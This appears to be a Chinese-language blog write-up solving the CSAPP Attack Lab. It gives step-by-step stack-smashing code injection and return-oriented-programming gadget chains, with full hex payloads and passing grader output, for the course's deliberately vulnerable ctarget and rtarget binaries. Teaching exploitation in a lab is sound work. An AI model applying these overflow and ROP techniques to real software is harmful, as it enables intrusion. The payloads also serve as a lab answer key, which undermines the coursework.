---
title: CSAPP--attacklab
index_img: /img/cmu.png
categories:
- OS
tags:
- labs
- C&C++
- linux
comment: valine
math: true



---

# 前言

本文是对CSAPP中attack lab的实现
<!-- more -->

# Attack Lab

## gdb调试

~~~bash
$gdb
$b *0x401982
$r -q	#使用CMU内网
~~~

## 生成机器字节代码

~~~bash
objdump -S -d ctarget
~~~

~~~bash
gcc -c 1.s -o 1.o 
objdump -d 1.o >1.txt
~~~

## Part 1

### Phase 1

#### 要求

- test函数执行到getbuf()，getbuf()返回时，跳转到touch1()函数中

~~~C
1 void test()
2 {
3 int val;
4 val = getbuf();
5 printf("No exploit. Getbuf returned 0x%x\n", val);
6 }
~~~

~~~C
1 void touch1()
2 {
3 vlevel = 1; /* Part of validation protocol */
4 printf("Touch1!: You called touch1()\n");
5 validate(1);
6 exit(0);
7 }
~~~

#### 解析

- 反汇编ctarget，找到test和getbuf、touch1，利用栈的特性去覆盖

- 发现getbuf分配40个字节，所以%rsp + 40由touch1的地址去覆盖原来的返回地址

- `./hex2raw < ctarget01.txt`是利用`hex2raw`工具将我们的输入看作字节级的十六进制表示进行转化，用来生成攻击字符串

  > ~~~bash
  > ./hex2raw <phase1.txt | ./ctarget -q
  > ~~~

- 利用管道将输入文件作为`ctarget`的输入参数

- 由于执行程序会默认连接 CMU 的服务器，`-q`表示取消这一连接

- 注入的二进制数据十六进制表示

  >~~~
  >00 00 00 00 00 00 00 00
  >00 00 00 00 00 00 00 00
  >00 00 00 00 00 00 00 00
  >00 00 00 00 00 00 00 00
  >00 00 00 00 00 00 00 00
  >c0 17 40 00 00 00 00 00
  >~~~

~~~assembly
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 <_/76_printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	retq   

00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop

00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
~~~

~~~bash
(gdb) print (char*) 0x403188
$2 = 0x403188 "No exploit.  Getbuf returned 0x%x\n"
~~~

#### 结果

~~~bash
lzy@DESKTOP-PS05SI3:~/csapp/attacklab/attacklab/target1$ ./hex2raw <phase1.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
~~~

***

### Phase 2

#### 要求

- 将touch2地址注入，其余与Phase1相同

~~~C
void touch2(unsigned val)
{
	vlevel = 2; /* Part of validation protocol */
	if (val == cookie) {
		printf("Touch2!: You called touch2(0x%.8x)\n", val);
		validate(2);
	} else {
		printf("Misfire: You called touch2(0x%.8x)\n", val);
		fail(2);
		}
	exit(0);
}
~~~

#### 解析

**1. 注意到touch2函数需要比较val与cookie的值，所以必须将cookie也注入进去；**

**2. ret指令是弹栈操作，与push操作一起可以实现传递参数和修改返回地址；**

**3. 实际上进行了两次ret**

![](C:\Github_io\source\img\csapp\attach_phase2.png)

- 我们先深入理解ret指令：

  >  在CPU中有一个“PC”即程序寄存器，在 x86-64 中用%rip表示，它时刻指向将要执行的下一条指令在内存中的地址。而我们的ret指令就相当于：
  >
  > ~~~assembly
  > pop %rip
  > ~~~

  > **即把栈中存放的地址弹出作为下一条指令的地址。**
  >
  > 利用push和ret就能实现我们的指令转移

- 查看cookie值

~~~bash
(gdb) x 0x6044e4
0x6044e4 <cookie>:      0x59b997fa
~~~

- 第一次ret重新回到getbuf的栈顶执行

~~~bash
(gdb) p $rsp
$1 = (void *) 0x5561dc78
~~~

- 产生字节码文件

~~~bash
gcc -c injectcode.s
objdump -d injectcode.o > injectcode.d
~~~

~~~assembly
phase2ass.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq   
~~~

- 注入的二进制数据十六进制表示

~~~
48 c7 c7 fa 97 b9 59 68 
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
~~~

#### 结果

~~~bash
lzy@DESKTOP-PS05SI3:~/csapp/attacklab/attacklab/target1$ ./hex2raw < phase2.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
~~~

***

### Phase 3

#### 要求

- **本题与上题类似，不同点在于传的参数是一个字符串。**

~~~C
void touch3(char *sval)
{
	vlevel = 3; /* Part of validation protocol */
	if (hexmatch(cookie, sval)) {
		printf("Touch3!: You called touch3(\"%s\")\n", sval);
		validate(3);
	} else {
		printf("Misfire: You called touch3(\"%s\")\n", sval);
		fail(3);
	}
	exit(0);
}
~~~

**`touch3`中调用了`hexmatch`，它的C语言代码为：**

~~~C
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
	char cbuf[110];
    /* Make position of check string unpredictable */
	char *s = cbuf + random() % 100;
	sprintf(s, "%.8x", val);
	return strncmp(sval, s, 9) == 0;
}
~~~

#### 思路

- **注意`s`的位置是随机的，我们写在`getbuf`栈中的字符串很有可能被覆盖，一旦被覆盖就无法正常比较。**

- 使用test的栈进行cookie字符串的存储；将字符串存放的地址写入`%rdi`
- 其余与Phase2相同

![](C:\Github_io\source\img\csapp\attack_phase3.png)

- 此时test的栈帧

  > ~~~bash
  > (gdb) p $rsp
  > $2 = (void *) 0x5561dca8
  > ~~~

- 生成的字节码文件

  > ~~~assembly
  > phase3ass.o:     file format elf64-x86-64
  > 
  > 
  > Disassembly of section .text:
  > 
  > 0000000000000000 <.text>:
  >    0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
  >    7:	68 fa 18 40 00       	pushq  $0x4018fa
  >    c:	c3                   	retq   
  > ~~~

- **我们的cookie`0x59b997fa`作为字符串转换为`ASCII`为：`35 39 62 39 39 37 66 61`**

- 注入的二进制数据十六进制表示

  > 由于在`test`栈帧中多利用了一个字节存放cookie，所以本题要**输入56个字节**。注入代码的字节表示放在开头，33-40个字节放置注入代码的地址用来覆盖返回地址，最后八个字节存放cookie的`ASCII` 。

~~~
48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
~~~

#### 结果

~~~
lzy@DESKTOP-PS05SI3:~/csapp/attacklab/attacklab/target1$ ./hex2raw < phase3.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 
~~~

***
## Part 2
- 采用了两种策略来对抗缓冲区溢出攻击

  > - 栈随机化。这段程序分配的栈的位置在每次运行时都是随机的，这就使我们无法确定在哪里插入代码
  > - 限制可执行代码区域。它限制栈上存放的代码是不可执行的。

### Phase 4

#### Return-Oriented Programming

**ROP：面向返回的程序设计**，就是在已经存在的程序中找到特定的以`ret`结尾的指令序列为我们所用，称这样的代码段为`gadget`，把要用到部分的地址压入栈中，每次`ret`后又会取出一个新的`gadget`，于是这样就能形成一个程序链。

~~~C
void setval_210(unsigned *p)
{
    *p = 3347663060U;
}
~~~

~~~assembly
0000000000400f15 <setval_210>:
	400f15: c7 07 d4 48 89 c7 	movl $0xc78948d4,(%rdi)
	400f1b: c3 					retq
~~~

查表可知，取其中一部分字节序列 48 89 c7 就表示指令`movq %rax, %rdi`，这整句指令的地址为`0x400f15`，于是从`0x400f18`开始的代码就可以变成下面这样：

~~~assembly
movq %rax, %rdi
ret
~~~

这个小片段就可以作为一个`gadget`为我们所用。

其它一些我们可以利用的代码都在文件`farm.c`中展示了出来

#### 要求

- 与Phase2相同

#### 分析

- push & pop指令

- 由于`gadget`的限制，原有的汇编不能实现，可以考虑使用多个寄存器；

- 发现可以使用`%rax`和`%rdi`共同使用

  > ![](C:\Github_io\source\img\csapp\push&pop.png)

~~~assembly
popq %rax	#将栈顶指针指的值赋值给%rax（这里可以存放cookie）
ret
###############
movq %rax, %rdi
ret
~~~

![](C:\Github_io\source\img\csapp\attack_phase4.png)

- 查找`rtarget.s`中对应的字节值
- `pop %rax`用`58`表示，于是查找`58`
- 得到指令地址为`0x4019ab`

~~~assembly
00000000004019a7 <addval_219>:
  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
  4019ad:       c3                      retq                   retq
~~~

- `movq %rax, %rdi`表示为`48 89 c7`，刚好能找到！其中 90 表示“空”，可以忽略
- 得到指令地址为`0x4019c5`

~~~assembly
00000000004019c3 <setval_426>:
  4019c3:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
  4019c9:       c3                      retq
~~~

- 注入的二进制数据十六进制表示

~~~
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
~~~

#### 结果

~~~bash
lzy@DESKTOP-PS05SI3:~/csapp/attacklab/attacklab/target1$ ./hex2raw < phase4.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
~~~

***

### Phase 5

#### 要求

- 同Phase 3

#### 分析

- 使用ROP
- 使用计算`%rsp`和偏移的值来找到存放cookie的地址
- 根据cookie前面存放的指令进行计算；（前面有10条指令）
- **注意：**`getbuf`执行`ret`后相当于进行了一次`pop`操作，`test`的栈顶指针`%rsp=%rsp+0x8`，所以`cookie`相对于此时栈顶指针的偏移量是`0x48`而不是`0x50`

~~~assembly
#地址：0x401aad
movq %rsp, %rax
ret

#地址：0x4019a2
movq %rax, %rdi
ret

#地址：0x4019cc
popq %rax
ret

### 插入偏移地址

#地址：0x4019dd
movl %eax, %edx
ret

#地址：0x401a70
movl %edx, %ecx
ret

#地址：0x401a13
movl %ecx, %esi
ret

#地址：0x4019d6
lea    (%rdi,%rsi,1),%rax
ret

#地址：0x4019a2
movq %rax, %rdi
ret

### 插入touch3的执行位置
~~~

![](C:\Github_io\source\img\csapp\attack_phase5.png)

- 二进制转十六进制

~~~
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
ad 1a 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
cc 19 40 00 00 00 00 00 
48 00 00 00 00 00 00 00 
dd 19 40 00 00 00 00 00 
70 1a 40 00 00 00 00 00 
13 1a 40 00 00 00 00 00 
d6 19 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
fa 18 40 00 00 00 00 00 
35 39 62 39 39 37 66 61
~~~

#### 结果

~~~bash
lzy@DESKTOP-PS05SI3:~/csapp/attacklab/attacklab/target1$ ./hex2raw < phase5.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AD 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 
~~~

